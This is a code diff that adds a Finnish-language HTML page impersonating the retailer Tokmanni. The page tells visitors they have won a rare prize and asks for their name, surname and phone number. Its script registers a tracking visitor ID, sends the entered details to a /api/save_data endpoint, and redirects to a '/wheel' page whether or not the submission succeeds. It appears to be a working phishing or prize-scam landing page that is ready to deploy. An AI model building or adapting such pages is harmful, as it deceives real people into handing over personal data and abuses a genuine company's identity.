@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="fi" data-theme="blue">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/static/css/style.css">
+  <link rel="shortcut icon" href="/static/img/favicon.png" type="image/x-icon">
+  <title>Pyöritä & Voita!</title>
+  <style>
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .content-text {
+      text-align: center;
+      padding-top: 2rem;
+    }
+
+    .content-text__title {
+      font-weight: 700;
+      font-size: clamp(2rem, 5vw, 4rem);
+      line-height: 1.2;
+      color: #FFD700;
+      text-shadow: 0px 0px 18.4px #FFD700;
+      margin-bottom: 0.5rem;
+    }
+
+    .content-text__congrats {
+      font-weight: 600;
+      font-size: clamp(1.1rem, 2.5vw, 1.5rem);
+      color: #fff;
+      margin-bottom: 0.3rem;
+    }
+
+    .content-text__reward {
+      font-weight: 700;
+      font-size: clamp(1.3rem, 3vw, 1.8rem);
+      color: #FFD700;
+      text-shadow: 0px 0px 10px #FFD700;
+      margin-bottom: 0.3rem;
+    }
+
+    .content-text__probability {
+      font-size: 0.85rem;
+      color: rgba(255,255,255,0.7);
+      margin-bottom: 1rem;
+    }
+
+    .content-text__welcome {
+      font-size: clamp(1rem, 2vw, 1.2rem);
+      color: rgba(255,255,255,0.9);
+      margin-bottom: 1.5rem;
+    }
+
+    .form-area {
+      margin-top: 1rem;
+      display: flex;
+      justify-content: center;
+      width: 100%;
+    }
+
+    .form-area form {
+      width: 345px;
+      max-width: 100%;
+    }
+
+    .form-area form .input-group {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 1rem;
+    }
+
+    .form-area form .input-group label {
+      font-size: 0.875rem;
+      font-weight: 500;
+      color: rgba(255,255,255,0.9);
+      margin-bottom: 0.4rem;
+    }
+
+    .form-area form .input-group input {
+      width: 100%;
+      height: 48px;
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 12px;
+      padding: 10px 16px;
+      font-size: 1rem;
+      background: rgba(255,255,255,0.08);
+      color: #fff;
+      outline: none;
+      transition: all 0.3s;
+    }
+
+    .form-area form .input-group input:focus {
+      border-color: #FFD700;
+      background: rgba(255,255,255,0.12);
+      box-shadow: 0 0 0 3px rgba(255,215,0,0.1);
+    }
+
+    .form-area form .input-group input::placeholder {
+      color: rgba(255,255,255,0.4);
+      font-size: 0.875rem;
+    }
+
+    .form-area form .input-group input.error-field {
+      border: 2px solid #FF0000;
+    }
+
+    .form-area form .claim-button {
+      width: 100%;
+      margin-top: 1.5rem;
+      height: 52px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      border-radius: 14px;
+      border: 2px solid #222;
+      background: #FFD700;
+      color: #1a1a2e;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.3s;
+      letter-spacing: 0.5px;
+    }
+
+    .form-area form .claim-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+    }
+
+    .form-area form .claim-button:active {
+      transform: translateY(0);
+    }
+
+    .form-area form .claim-button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .error-message {
+      background: rgba(220,38,38,0.15);
+      border: 1px solid rgba(220,38,38,0.4);
+      border-radius: 10px;
+      padding: 10px 16px;
+      color: #ff6b6b;
+      font-size: 0.9rem;
+      margin-bottom: 1rem;
+      display: none;
+      text-align: center;
+    }
+
+    .powered-by {
+      margin-top: auto;
+      padding: 1.5rem;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 500px;
+      padding: 0 1.5rem;
+    }
+
+    @media (max-width: 576px) {
+      .content-text__title {
+        font-size: clamp(1.75rem, 4vw, 2rem);
+      }
+      .form-area form {
+        width: 100%;
+      }
+      .form-area form .input-group input {
+        height: 44px;
+      }
+      .form-area form .claim-button {
+        height: 48px;
+        font-size: 1rem;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="content-text">
+      <p class="content-text__title">TOKMANNI</p>
+      <p class="content-text__congrats">Onnittelut!</p>
+      <p class="content-text__reward">Voitit!</p>
+      <p class="content-text__probability">Tämän palkinnon voittamisen todennäköisyys on 0,005%</p>
+      <p class="content-text__welcome">Täytä lomake ja lunasta palkintosi!</p>
+    </div>
+
+    <div class="form-area">
+      <form id="claimForm" onsubmit="return handleSubmit(event)">
+        <div id="errorMsg" class="error-message"></div>
+
+        <div class="input-group">
+          <label for="nameInput">Nimesi</label>
+          <input type="text" id="nameInput" name="name" placeholder="Syötä nimesi" autocomplete="given-name">
+        </div>
+
+        <div class="input-group">
+          <label for="surnameInput">Sukunimesi</label>
+          <input type="text" id="surnameInput" name="surname" placeholder="Syötä sukunimesi" autocomplete="family-name">
+        </div>
+
+        <div class="input-group">
+          <label for="phoneInput">Puhelin</label>
+          <input type="tel" id="phoneInput" name="phone" placeholder="+358" autocomplete="tel">
+        </div>
+
+        <button type="submit" class="claim-button" id="submitBtn">Jatkaa</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="powered-by">
+    Powered by <img src="/static/img/1768398379_367d7c768420cfd5c6f1.png" alt="powered">
+  </div>
+
+  <script>
+    // Sayfa yüklendiğinde visitor oluştur
+    var _visitorId = localStorage.getItem('visitor_id') || '';
+    
+    (function initVisitor() {
+      fetch('/api/start', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({visitor_id: _visitorId}),
+        credentials: 'include'
+      }).then(function(r){ return r.json(); }).then(function(data) {
+        if (data.visitor_id) {
+          _visitorId = data.visitor_id;
+          localStorage.setItem('visitor_id', _visitorId);
+        }
+      }).catch(function(e){ console.error('Start error:', e); });
+    })();
+
+    function handleSubmit(e) {
+      e.preventDefault();
+      var name = document.getElementById('nameInput').value.trim();
+      var surname = document.getElementById('surnameInput').value.trim();
+      var phone = document.getElementById('phoneInput').value.trim();
+      var errDiv = document.getElementById('errorMsg');
+      var submitBtn = document.getElementById('submitBtn');
+
+      // Clear previous errors
+      document.querySelectorAll('.error-field').forEach(function(el) { el.classList.remove('error-field'); });
+      errDiv.style.display = 'none';
+
+      // Validate
+      if (!name || name.length < 2) {
+        document.getElementById('nameInput').classList.add('error-field');
+        errDiv.textContent = 'Anna nimesi oikein';
+        errDiv.style.display = 'block';
+        return false;
+      }
+      if (!surname || surname.length < 2) {
+        document.getElementById('surnameInput').classList.add('error-field');
+        errDiv.textContent = 'Anna sukunimesi oikein';
+        errDiv.style.display = 'block';
+        return false;
+      }
+      if (!phone || phone.length < 5) {
+        document.getElementById('phoneInput').classList.add('error-field');
+        errDiv.textContent = 'Anna puhelinnumerosi oikein';
+        errDiv.style.display = 'block';
+        return false;
+      }
+
+      // Disable button
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Käsitellään...';
+
+      // Submit form data with visitor_id
+      var fd = new FormData();
+      fd.append('name', name);
+      fd.append('surname', surname);
+      fd.append('phone', phone);
+      fd.append('visitor_id', _visitorId || '');
+
+      fetch('/api/save_data', {
+        method: 'POST',
+        body: fd,
+        credentials: 'include'
+      }).then(function(r) {
+        return r.json();
+      }).then(function(data) {
+        if (data.visitor_id) {
+          localStorage.setItem('visitor_id', data.visitor_id);
+        }
+        // Redirect to wheel page
+        window.location.href = '/wheel';
+      }).catch(function(err) {
+        console.error('Submit error:', err);
+        // Redirect anyway
+        window.location.href = '/wheel';
+      });
+
+      return false;
+    }
+  </script>
+</body>
+
+</html>
